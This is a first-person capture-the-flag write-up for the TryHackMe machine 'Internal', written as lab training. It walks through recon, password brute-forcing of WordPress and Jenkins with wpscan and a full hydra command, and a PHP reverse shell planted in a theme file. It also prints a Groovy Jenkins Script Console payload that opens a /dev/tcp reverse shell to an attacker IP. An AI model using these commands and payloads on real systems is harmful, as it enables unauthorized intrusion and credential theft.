# -Internal- Writeup

First of all this is my first writeup after solving a machine. I solved a few of TryHackme machines before, but these were all a lot more guided and easier and without any rabbit holes (or at least I did not find them).

I hope it helps you to solve this machine like it helped me to read Writeups.

## Introduction
We are going to solve the machine: **Internal** available on [TryHackMe](https://tryhackme.com).  
Before working with the machine, add an entry to your `/etc/hosts` mapping the IP (in my case `10.10.190.47`) to `internal.thm`.

## Recon
I started throwing nmap on the target. With a complete scan with `nmap -A internal.thm` I saw two open ports, 22 and 80.

```
Nmap scan report for internal.thm (10.10.190.47)
Host is up (0.00062s latency).

PORT   STATE SERVICE VERSION

No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
```

With the `nmap internal.thm --script vuln` command I tried to find some general known vulnerabilities in the services, but without success.

## Enumeration
Then I used gobuster to look for some known directories:
`gobuster dir -u 10.10.190.47 -w /usr/share/wordlists/dirbuster/directory-list-1.0.txt`

I found three potentially interesting directories:
```
/blog (Status: 301)
/wordpress (Status: 301)
/phpmyadmin (Status: 301)
```

I decided to try out finding some information about wordpress first. You may also notice that blog and wordpress are pointing to the same application.
Opening the page on `internal.thm/blog` I saw the default installation of WordPress.

### WordPress Enumeration
Knowing that a default WordPress login is accessible via `/blog/wp-admin.php`, I navigated to that page and tested out some credentials.

Wild guessing the user might be `admin`, WordPress told me the password for that user was wrong. 
On the other hand: If I used another, non-existing user, WordPress told me `Uknown username`. 
So now I know `admin` is an existing user, nice!

Let's use another tool from our toolchain: **wpscan**. WPScan has a lot of useful parameters. Using the following command, we can find the password for the admin:
`wpscan --url http://internal.thm/wordpress --usernames 'admin' --passwords /usr/share/wordlists/rockyou.txt`

After a few seconds I found the password for the admin user and few further details.

## Accessing the System and gaining shell access
After logging in I decided to not install a reverse shell plugin, but to include a PHP reverse shell from pentestmonkey into the `404.php` page.

On my system I waited for a connection via `nc -nlvp 1234`.

After opening a random page on the blog, the session opened and I could get shell access.

Looking into `/home`-dir, I found an user `aubreanna`. I could access the user's home dir.

But we know from before that there is also a `phpmyadmin`-instance which is by default placed under `/etc/phpmyadmin`. Via catting the `config-db.php`, I could find the default password for the phpmyadmin-user.

After searching some time for further infos I got a bit stuck. No infos could be found here, no user information etc.

Before looking for further infos, I found an article on WordPress called _Private_. Credentials for the user william were there.
I hoped it was some more-privileged user for SSH but via `cat /etc/passwd` I could verify there is no user with the username `william`. 

Without finding further information, I checked `/opt`-directory since I usually put my apps here and found an maybe interesting file: `wp-save.txt`.

And luckily I found some credentials for aubreanna! :)

After using these credentials I was able to find the `user.txt` in the *aubreanna's* home directory and found a flag here. :)

## Privilege Escalation
Next hint in aubreanna's directory was the `jenkins.txt`.
But actually I could see that this Jenkins instance is on another network. I used an SSH tunnel to access this network via the `internal.thm`:

```bash
ssh -L 8888:172.17.0.2:8080 -l aubreanna internal.thm
```
`localhost:8888` showed me the Jenkins login page. I tried to use the credentials exposed on WordPress, but that did not work. 
Maybe I could find something with hydra.

But which user should I take? After having a short research on that, I found out there might be an `admin` user by default.
With Hydra and a little help of my network console, I saw three things I need for cracking the password:

```
File: /j_acegi_security_check
Request Body: j_username=admin&j_password=admin&from=%2F&Submit=Sign+in
```
Addtionally I know the error when login does not succeed: _Invalid username or password_
So I could construct the hydra-command and replace user and pw with placeholders:

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt localhost -s 8888 http-post-form "/j_acegi_security_check:j_username=^USER^&j_password=^PASS^&from=%2F&Submit=Sign+in:Invalid username or password"
```

Using this command we found the password for our admin user.

From [this](https://alionder.net/jenkins-script-console-code-exec-reverse-shell-java-deserialization/) site, we can now gain the information of how we can create a reverse shell from Jenkins Script Console (which can be found in Jenkins->Node->master->Script Console):
```groovy
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.10.7.212/4321;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
```

After listening for this via `nc -nlvp 4321`, we are again on another machine.
Guessing to see again some useful info in `/opt`, I check the directory and - quel surprise - we can find a `note.txt`.

As we can see, we find some relevant info here. ;) 
Let's login to `internal.thm `as root and capture our root-flag.
